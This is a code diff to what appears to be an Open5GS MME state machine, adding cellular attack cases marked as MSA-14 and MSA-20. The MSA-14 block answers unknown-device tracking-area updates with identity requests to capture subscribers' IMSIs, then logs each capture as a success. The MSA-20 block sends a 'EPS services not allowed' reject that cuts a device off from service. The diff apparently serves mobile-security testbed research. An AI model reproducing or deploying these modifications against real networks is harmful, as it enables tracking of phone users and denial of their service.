@@ -443,6 +443,10 @@ static void common_register_state(ogs_fsm_t *s, mme_event_t *e,
 
             rv = emm_handle_identity_response(enb_ue, mme_ue,
                     &message->emm.identity_response);
+
+            // PRINT IMSI TO LOG:
+            ogs_info(">>> [MSA-14 SUCCESS] Captured IMSI: %s <<<", mme_ue->imsi_bcd);
+
             if (rv != OGS_OK) {
                 ogs_error("emm_handle_identity_response() failed");
                 MME_RESTORE_CONTEXT_ON_FAILURE(mme_ue, s);
@@ -551,15 +555,44 @@ static void common_register_state(ogs_fsm_t *s, mme_event_t *e,
                 break;
             }
 
+            // if (!MME_UE_HAVE_IMSI(mme_ue)) {
+            //     ogs_info("TAU request : Unknown UE");
+            //     r = nas_eps_send_tau_reject(enb_ue, mme_ue,
+            //         OGS_NAS_EMM_CAUSE_UE_IDENTITY_CANNOT_BE_DERIVED_BY_THE_NETWORK);
+            //     ogs_expect(r == OGS_OK);
+            //     ogs_assert(r != OGS_ERROR);
+            //     MME_RESTORE_CONTEXT_ON_FAILURE(mme_ue, s);
+            //     break;
+            // }
+
+// MSA#14: IMSI CATCHING
+
+            if (!MME_UE_HAVE_IMSI(mme_ue))
+            {
+                ogs_info("[MSA-14] TAU request from Unknown GUTI -> Sending Identity Request (IMSI Catching)");
+                CLEAR_MME_UE_TIMER(mme_ue->t3470);
+                r = nas_eps_send_identity_request(mme_ue);
+                ogs_expect(r == OGS_OK);
+                ogs_assert(r != OGS_ERROR);
+                break;
+            }
+
+// END OF MSA#14
+
+// MSA#20: TAU Reject
+
             if (!MME_UE_HAVE_IMSI(mme_ue)) {
                 ogs_info("TAU request : Unknown UE");
+                ogs_info("[MSA-20] Sending TAU Reject with Cause #7 (EPS services not allowed)");
                 r = nas_eps_send_tau_reject(enb_ue, mme_ue,
-                    OGS_NAS_EMM_CAUSE_UE_IDENTITY_CANNOT_BE_DERIVED_BY_THE_NETWORK);
+                    OGS_NAS_EMM_CAUSE_EPS_SERVICES_NOT_ALLOWED); // Cause #7 (use OGS_NAS_EMM_CAUSE_NO_SUITABLE_CELLS_IN_TRACKING_AREA for Cause #15)
                 ogs_expect(r == OGS_OK);
                 ogs_assert(r != OGS_ERROR);
                 MME_RESTORE_CONTEXT_ON_FAILURE(mme_ue, s);
                 break;
             }
+
+ // END OF MSA#20
 
             if (!SESSION_CONTEXT_IS_AVAILABLE(mme_ue)) {
                 ogs_warn("No PDN Connection : UE[%s]", mme_ue->imsi_bcd);
@@ -1162,6 +1195,13 @@ void emm_state_authentication(ogs_fsm_t *s, mme_event_t *e)
 
             OGS_FSM_TRAN(s, &emm_state_authentication);
             break;
+
+// MSA#2: Service Reject
+
+
+
+// END OF MSA#2
+
         case OGS_NAS_EPS_EMM_STATUS:
             ogs_warn("EMM STATUS : IMSI[%s] Cause[%d]",
                     mme_ue->imsi_bcd, message->emm.emm_status.emm_cause);
